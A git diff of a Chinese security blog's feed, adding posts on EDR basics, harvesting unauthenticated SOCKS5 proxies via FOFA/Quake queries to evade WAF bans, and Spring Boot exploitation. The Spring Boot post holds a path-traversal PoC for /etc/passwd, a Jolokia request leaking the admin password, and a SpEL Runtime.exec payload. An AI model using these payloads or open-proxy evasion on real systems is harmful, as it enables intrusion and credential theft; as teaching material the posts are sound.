+&lt;h1 id=&#34;什么是edr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是edr&#34;&gt;#&lt;/a&gt; 什么是EDR？&lt;/h1&gt;
+&lt;p&gt;EDR，全称Endpoint Detection and Response，是一种用于&lt;strong&gt;检测、预防、响应和预测&lt;/strong&gt;计算机或网络中发生的安全威胁的技术和方法。它通过在端点上收集各种日志和事件数据，实时监控和分析这些数据，以发现异常行为或潜在的安全威胁，并采取相应的措施进行响应。与SIEM相比，EDR更注重端点安全，强调端点检测与响应&lt;/p&gt;
+&lt;h1 id=&#34;四大功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四大功能&#34;&gt;#&lt;/a&gt; 四大功能&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;实时监控&lt;/strong&gt;：EDR系统实时监控端点设备的活动，包括文件访问、进程执行、网络连接等，以便识别异常行为。&lt;br /&gt;
+&lt;strong&gt;威胁检测&lt;/strong&gt;：它使用行为分析、签名匹配、机器学习等技术来检测潜在的威胁和攻击模式。&lt;br /&gt;
+&lt;strong&gt;威胁响应&lt;/strong&gt;：EDR能够快速响应检测到的威胁，采取措施如隔离感染设备、阻止攻击传播、修复漏洞等。&lt;br /&gt;
+&lt;strong&gt;调查和分析&lt;/strong&gt;：它提供详细的事件日志和威胁情报，有助于安全团队进行调查和分析，了解攻击的来源和影响。&lt;/p&gt;
+&lt;h1 id=&#34;工作原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工作原理&#34;&gt;#&lt;/a&gt; 工作原理&lt;/h1&gt;
+&lt;p&gt;1、各个服务器终端安装Agent;&lt;br /&gt;
+2、通过Agent将“行为数据：进程、网络访问、文件特征..、静态样本、系统，软件特征、硬件特征等信息上传分析平台（服务端）&lt;br /&gt;
+3、服务端通过&lt;strong&gt;1）威胁情报2）沙箱3）AI模型&lt;/strong&gt;等进行分析&lt;br /&gt;
+4）通过服务端的分析后对那些危险的样本进行隔离、危险进程进行阻断等。&lt;/p&gt;
+&lt;h1 id=&#34;edr与传统杀毒软件的区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#edr与传统杀毒软件的区别&#34;&gt;#&lt;/a&gt; EDR与传统杀毒软件的区别&lt;/h1&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/images/EDR/1.png&#34; alt=&#34;0&#34; /&gt;&lt;br /&gt;
+&lt;strong&gt;对于端点安全，传统杀毒软件&lt;/strong&gt;&lt;br /&gt;
+是怎么做的？&lt;br /&gt;
+传统杀毒软件是基于签名的，所以它只识别已知的威胁。&lt;br /&gt;
+传统杀毒软件可以包括定期或定期扫描受保护设备，以检测已知的威胁协助清除更基本的病毒（蠕虫，木马，恶意软件，广告软件，间谍软件等）&lt;br /&gt;
+基于数据库来提供关于可能恶意网站的警告&lt;/p&gt;
+&lt;p&gt;对于端点安全，&lt;strong&gt;EDR（终端检测与响应）是怎么做的&lt;/strong&gt;？&lt;br /&gt;
+EDR 包括对威胁的实时监控和检测，包括那些可能不容易被标准反病毒识别或定义的威胁。此外，EDR是基于行为的，因此它可以基于不正常的行为检测未知的威胁。&lt;br /&gt;
+基于大数据和人工智能的数据收集和分析系统，以此确定威胁模式，并向用户发出威胁警报附带取证功能可以帮助确定在安全事件中发生了什么攻击行为&lt;br /&gt;
+EDR 可以包括对某些威胁的自动修复或移除，例如主机的微隔离，通过控制主机的进出站流量，实现对异常主机的隔离。&lt;br /&gt;
+总的来说杀毒只能对已知的病毒进行查杀，且不能知晓攻击路径或漏洞点；EDR 根据行为则可以应对 Oday 攻击，&lt;br /&gt;
+且能分析出攻击路径。&lt;/p&gt;
+&lt;h1 id=&#34;edr选型需要注意的陷阱和误区&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#edr选型需要注意的陷阱和误区&#34;&gt;#&lt;/a&gt; EDR选型需要注意的陷阱和误区&lt;/h1&gt;
+&lt;p&gt;IDC安全与信任研究副总裁MichaelSuby表示，EDR最大的陷阱（误区）是很多企业认为EDR是“一劳永逸”的解决方案：“你不能想当然地认为只需要购买并运行EDR工具就可以解决一切问题。事实并非如此，你还必须拥有足够的内部人才，能够有效地学习和操作EDR软件。“就初始投资和持续维护成本而言，EDR产品比传统防病毒软件更昂贵，这使得购买、实施和维护EDR工具对于中小型企业来说成本过高。除了投资和运维成本高以外，EDR常见的“坑”是企业没有足够经验丰富的操作人员来使用该软件。EDR软件对操作人员的技能要求通常较高，因为操作人员需要追踪事件的路径，并根据行为确定其是否恶意。这意味着无论是招聘还是外包，EDR都会带来人力相关成本的增加。&lt;/p&gt;
+&lt;p&gt;最后，一些EDR工具的可扩展性有限，不能伴随公司发展过程持续改善其安全状况。在高峰使用期间，有限的可扩展性可能会导致延迟或停机，从而影响企业快速检测和响应安全事件的能力。&lt;/p&gt;
+&lt;p&gt;EDR要注意带宽的使用，因为他使用的不是本地的计算机资源，更多的是把信息传递到服务端，，所以要特别注意带宽的使用，特别是专网上，大量的agent采集的数据，通过专网汪服务器传递，就会导致网络堵塞。&lt;/p&gt;
+&lt;h1 id=&#34;同类产品简单区分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同类产品简单区分&#34;&gt;#&lt;/a&gt; 同类产品简单区分&lt;/h1&gt;
+&lt;h2 id=&#34;和同类产品区分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#和同类产品区分&#34;&gt;#&lt;/a&gt; 和同类产品区分&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;SIEM&lt;/strong&gt;：侧重日志汇聚 + 关联分析，发现攻击行为&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;EDR/XDR&lt;/strong&gt;：侧重终端威胁检测&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;NDR&lt;/strong&gt;：侧重网络流量分析&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+        <updated>2026-07-13T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://adm1n10086.github.io/2026/07/02/%E4%BB%A3%E7%90%86%E6%B1%A0/</id>
+        <title>如何使用fofa白嫖代理池</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/07/02/%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
+        <content type="html">&lt;p&gt;在渗透测试与漏洞挖掘过程中，IP因触发WAF频率限制而被封禁，是导致测试进程中断、效率降低的根源性问题。本期提供一套完整的对抗方案：基于TscanPlus构建自动化代理池，实现免费代理的批量抓取、存活检测与智能轮询，当节点失效时毫秒级自动切换，确保扫描流量始终经由可用代理发出，彻底规避源地址封锁。同时，通过Proxifier为各类安全工具配置全局代理规则，使漏洞扫描器、信息收集工具等所有本地测试组件无缝接入代理链路，实现全流程匿名化渗透。这套方案将彻底解除IP封禁对测试进度的制约，显著提升攻防演练与日常漏洞挖掘的持续性和效率。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/images/%E4%BB%A3%E7%90%86%E6%B1%A0/1.png&#34; alt=&#34;alt text&#34; /&gt;&lt;br /&gt;
+Fofa 资产搜索语法：&lt;br /&gt;
+protocol==&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; &amp;quot;Version:5 Method:No Authentication(0x00)&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot;&lt;br /&gt;
+protocol=&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;No Authentication&amp;quot;&lt;br /&gt;
+protocol=&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;0x00&amp;quot;&lt;br /&gt;
+protocol=&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;method&amp;quot; &amp;amp;&amp;amp; &amp;quot;no authentication&amp;quot;&lt;br /&gt;
+port=&amp;quot;1080&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; &amp;quot;0x00&amp;quot;&lt;br /&gt;
+banner=&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; banner=&amp;quot;0x00&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot;&lt;br /&gt;
+protocol=&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;authentication&amp;quot; &amp;amp;&amp;amp; &amp;quot;none&amp;quot;&lt;br /&gt;
+port=&amp;quot;1080&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;SOCKS5&amp;quot; &amp;amp;&amp;amp; &amp;quot;NO AUTHENTICATION&amp;quot;&lt;br /&gt;
+header=&amp;quot;socks&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;0x05&amp;quot; &amp;amp;&amp;amp; &amp;quot;0x00&amp;quot;&lt;br /&gt;
+protocol=&amp;quot;socks5&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot; &amp;amp;&amp;amp; &amp;quot;Method: No Authentication&amp;quot;&lt;br /&gt;
+banner=&amp;quot;SOCKS5&amp;quot; &amp;amp;&amp;amp; banner=&amp;quot;authentication&amp;quot; &amp;amp;&amp;amp; banner=&amp;quot;none&amp;quot; &amp;amp;&amp;amp; country=&amp;quot;CN&amp;quot;&lt;br /&gt;
+Quake 资产搜索语法：&lt;br /&gt;
+service:&amp;quot;socks5&amp;quot; AND country_cn:&amp;quot;中国&amp;quot; AND response:&amp;quot;No Authentication&amp;quot;&lt;br /&gt;
+service:socks5 AND country: &amp;quot;CN&amp;quot; AND response:&amp;quot;No authentication&amp;quot; AND port:8888&lt;br /&gt;
+service:socks5 AND country: &amp;quot;CN&amp;quot; AND response:&amp;quot;No authentication&amp;quot; AND port:8080&lt;br /&gt;
+service:socks5 AND country: &amp;quot;CN&amp;quot; AND response:&amp;quot;No authentication&amp;quot; AND port:1080&lt;/p&gt;
+</content>
+        <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+        <updated>2026-07-01T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://adm1n10086.github.io/2026/07/02/spring%20boot%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</id>
+        <title>spring boot常见漏洞</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/07/02/spring%20boot%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;java之springboot漏洞利用姿势合集总结详细版&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java之springboot漏洞利用姿势合集总结详细版&#34;&gt;#&lt;/a&gt; Java之SpringBoot漏洞利用姿势合集总结详细版&lt;/h1&gt;
+&lt;p&gt;Spring 框架是一个功能强大的 Java 应用程序框架，旨在提供高效且可扩展的开发环境，不同部分的讲解，Spring生态系统中有五个关键部分，分别是&lt;strong&gt;Spring Framework、Spring Boot、Spring Cloud、Spring Security和Spring MVC&lt;/strong&gt;&lt;br /&gt;
+简述如下：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Framework&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;核心架构：提供依赖注入（IoC）、面向切面编程（AOP）、数据访问和事务管理等基础功能。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring MVC：用于构建Web应用程序和RESTful服务的MVC框架。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring MVC&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Web框架：基于Spring Framework的模块，用于开发Web应用和API。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;主要特性：DispatcherServlet、注解驱动、视图解析等。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Boot&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;简化开发：基于Spring Framework，提供自动配置、内嵌服务器、快速启动等功能。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;主要特性：自动配置、内嵌Tomcat、独立运行、Starter依赖。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Cloud&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;微服务架构：基于Spring Boot，提供构建分布式系统和微服务的工具。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;主要特性：服务发现、负载均衡、配置管理、断路器、API网关等。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Security&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;安全框架：为Spring应用提供认证和授权功能。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;主要特性：身份验证、访问控制、Web安全保护。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;它们的关系&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Framework：基础框架，包含核心功能和Spring MVC。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring MVC：Spring Framework中的Web框架模块。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Boot：简化Spring应用开发，内置于Spring Framework之上。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Cloud：基于Spring Boot，支持微服务架构。&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Spring Security：集成在Spring Framework中，提供安全功能。&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;spring-boot-starter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-boot-starter&#34;&gt;#&lt;/a&gt; Spring Boot Starter&lt;/h1&gt;
+&lt;p&gt;如果只是将xml配置换成javaconfig配置，其实减少不了配置的工作量。我们配置工作量的减少，还得感谢Spring Boot Starter，是它帮我们完成了大量的配置工作，我们只需完成很少一部分配置即可。&lt;/p&gt;
+&lt;p&gt;springboot自动配置用到的注解 @SpringBootApplication、@SpringBootConfiguration、@ComponentScan @EnableAutoConfiguration、@AutoConfigrationPackage、@EnableConfigurationProperties&lt;br /&gt;
+外部配置文件导入注解 @PropertySource&lt;br /&gt;
+定时任务用到注解 @EnableScheduling、@Scheduled、@EnableAsync、@Async&lt;br /&gt;
+过滤器 @WebFilter、@ServletComponentScan&lt;br /&gt;
+拦截器&lt;br /&gt;
+监听器&lt;br /&gt;
+校验器 @Validated&lt;br /&gt;
+异常处理 @ControllerAdvice、@ExceptionHandler&lt;/p&gt;
+&lt;p&gt;自动加载原理：&lt;br /&gt;
+SpringBoot 在启动时会去依赖的starter包中寻找 resources/META-INF/spring.factories文件，然后根据文件中配置的Jar包去扫描项目所依赖的Jar包，这类似于 Java 的 SPI 机制。注释：SPI的英文名称是Service Provider Interface，是Java 内置的服务发现机制。&lt;br /&gt;
+根据spring.factories配置加载AutoConfigure类。&lt;br /&gt;
+根据 @Conditional注解的条件，进行自动配置并将Bean注入Spring Context上下文当中&lt;/p&gt;
+&lt;h2 id=&#34;常见漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见漏洞&#34;&gt;#&lt;/a&gt; 常见漏洞：&lt;/h2&gt;
+&lt;p&gt;springboot-cve_2021_21234&lt;br /&gt;
+环境：&lt;a href=&#34;http://vulfocus.cn&#34;&gt;vulfocus.cn&lt;/a&gt;&lt;br /&gt;
+Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。&lt;/p&gt;
+&lt;p&gt;存在文件包含漏洞&lt;br /&gt;
+漏洞Poc&lt;br /&gt;
+/manage/log/view?filename=/etc/passwd&amp;amp;base=../../../../../../../../../../&lt;br /&gt;
+修复方案：升级到 0.2.13&lt;/p&gt;
+&lt;h1 id=&#34;springcloud&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#springcloud&#34;&gt;#&lt;/a&gt; SpringCloud&lt;/h1&gt;
+&lt;p&gt;Spring Cloud是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。&lt;br /&gt;
+参考大师傅的一张图：&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/source/images/spring/1.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;信息泄露漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息泄露漏洞&#34;&gt;#&lt;/a&gt; 信息泄露漏洞&lt;/h2&gt;
+&lt;p&gt;此漏洞主要就是一些路由地址和接口的信息泄露，验证路由如下&lt;br /&gt;
+利用工具springscan 扫描&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/v2/api-docs&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/swagger-ui.html&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/env&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;//获取参数信息&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/mappings&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/metrics&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/beans&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/configprops&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/actuator/metrics&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/actuator/mappings&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/actuator/beans&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;/actuator/configprops&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;springscan地址：&lt;/p&gt;
+&lt;p&gt;敏感信息明文获取&lt;br /&gt;
+如果说目标网站存在一些接口依赖 jolokia-cor&lt;br /&gt;
+如/jolokia、/actuator/jolokia&lt;/p&gt;
+&lt;p&gt;调用 org.springframework.boot Mbean&lt;br /&gt;
+实际上是调用org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty方法&lt;br /&gt;
+poc&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;//spring 1.x 版本&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;markup&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;POST /jolokia&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Content-Type: application/json&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&#34;mbean&#34;: &#34;org.springframework.boot:name=SpringApplication,type=Admin&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;security.user.password&#34;]&amp;#125;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;//spring 2.x 版本&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;markup&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;POST /actuator/jolokia&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;Content-Type: application/json&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&#34;mbean&#34;: &#34;org.springframework.boot:name=SpringApplication,type=Admin&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;security.user.password&#34;]&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;远程代码执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程代码执行&#34;&gt;#&lt;/a&gt; 远程代码执行&lt;/h1&gt;
+&lt;p&gt;主要问题是在于springboot存在一些组件漏洞造成的的，总结如下一些方法&lt;/p&gt;
+&lt;p&gt;Spring Boot whitelabel error page 远程命令执行漏&lt;br /&gt;
+漏洞原理：主要是因为使用了springboot默认错误页在处理参数值使用递归流程，流程进入到PropertyPlaceholderHelper 类中，${}包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞&lt;br /&gt;
+漏洞文件：ErrorMvcAutoConfiguration.java&lt;/p&gt;
+&lt;p&gt;漏洞复现，测试网站是否存在Whitelabel Error Page，通过fuzz一些参数值，如id、sid存在500报错，则可以测试去执行Spel表达式注入&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;/source/images/spring/2.png&#34; alt=&#34;alt text&#34; /&gt;&lt;br /&gt;
+漏洞poc&lt;br /&gt;
+生成16进制的脚本&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;input_string = &#34;open -a Calculator&#34;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;hex_list = []&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;for ch in input_string:&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;    # 将字符转换为十六进制表示，并添加到列表中&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;    hex_list.append(f&#34;0x&amp;#123;ord(ch):02x&amp;#125;&#34;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;hex_string = &#39;, &#39;.join(hex_list)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;print(hex_string)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;//测试漏洞是否存在&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;$&amp;#123;6*6&amp;#125;   //看是否有返回36&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;//执行Calc命令&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;$&amp;#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&amp;#123;0x63, 0x61, 0x6c, 0x63&amp;#125;))&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;。。。。。。&lt;/p&gt;
+&lt;h1 id=&#34;参考内容&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考内容&#34;&gt;#&lt;/a&gt; 参考内容：&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/news/14303&#34;&gt;https://xz.aliyun.com/news/14303&lt;/a&gt;&lt;br /&gt;
+侵删&lt;/p&gt;
+</content>
+        <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+        <updated>2026-07-01T16:00:00.000Z</updated>
     </entry>
     <entry>
         <id>https://adm1n10086.github.io/2026/06/08/%E5%B8%B8%E8%A7%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%86%E5%88%AB%E7%89%B9%E5%BE%81/</id>
@@ -2385,7 +2439,7 @@ get(&amp;quot;url&amp;quot;)+list，这种动态拼接可能找不出来&lt;br /
 &lt;img loading=&#34;lazy&#34; src=&#34;/images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/12.png&#34; alt=&#34;1&#34; /&gt;&lt;br /&gt;
 很多站点都有这种情况，你要会：&lt;br /&gt;
 他怎么知道我没更改初始密码？所以说肯定有一个数据包说明我没修改密码，只需要把那个数据包截住，改掉就行&lt;br /&gt;
-但是如果遇到从整个前端的一个静态的STML返回过来的，改不了数据包怎么办&lt;br /&gt;
+但是如果遇到从整个前端的一个静态的HTML返回过来的，改不了数据包怎么办&lt;br /&gt;
 将弹窗页面删除，F12前端直接删除&lt;br /&gt;
 web端和小程序端命名方式相似，可以从web端猜出小程序端的完整端口（小程序不进行反编译的话，js看不到），由Web端的参数尝试注入&lt;/p&gt;
 &lt;p&gt;实战2：浙江大学统一认证，先进入后台，后又发现你没登陆，身份认证判定不通过，跳转到CAS统一身份认证了&lt;br /&gt;
@@ -2485,6 +2539,250 @@ hunter，quake，fofa&lt;br /&gt;
 服务号公众号什么的不说了，其他人都打过了，但是注意文章，什么6天前7天前的文章，会有密码命名规则，或者新的页面&lt;/p&gt;
 </content>
         <category term="网络安全" scheme="https://adm1n10086.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
+        <updated>2026-05-12T16:00:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://adm1n10086.github.io/2026/05/13/%E9%9D%A2%E8%AF%95%E8%A6%81%E6%B1%82/</id>
+        <title>实习要求</title>
+        <link rel="alternate" href="https://adm1n10086.github.io/2026/05/13/%E9%9D%A2%E8%AF%95%E8%A6%81%E6%B1%82/"/>
+        <content type="html">&lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
+&lt;p&gt;该文章总结各个岗位我所看见的，所遇见的，所听过的岗位要求：&lt;/p&gt;
